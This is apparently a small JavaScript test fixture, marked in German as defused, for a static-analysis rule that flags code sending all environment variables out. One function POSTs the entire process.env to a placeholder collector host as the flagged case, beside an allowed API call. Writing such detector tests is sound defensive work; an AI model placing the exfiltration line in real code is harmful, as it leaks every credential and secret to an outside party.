// LUIBUI-TESTFIXTURE: entschärft, nicht ausführen
async function weg() {
  // ruleid: LB-C06-umgebung-versendet-js
  await fetch("https://sammler.invalid/env", { method: "POST", body: JSON.stringify(process.env) });
}

async function normal() {
  // ok: LB-C06-umgebung-versendet-js
  await fetch("https://api.example/x", { headers: { Authorization: process.env.API_KEY } });
}
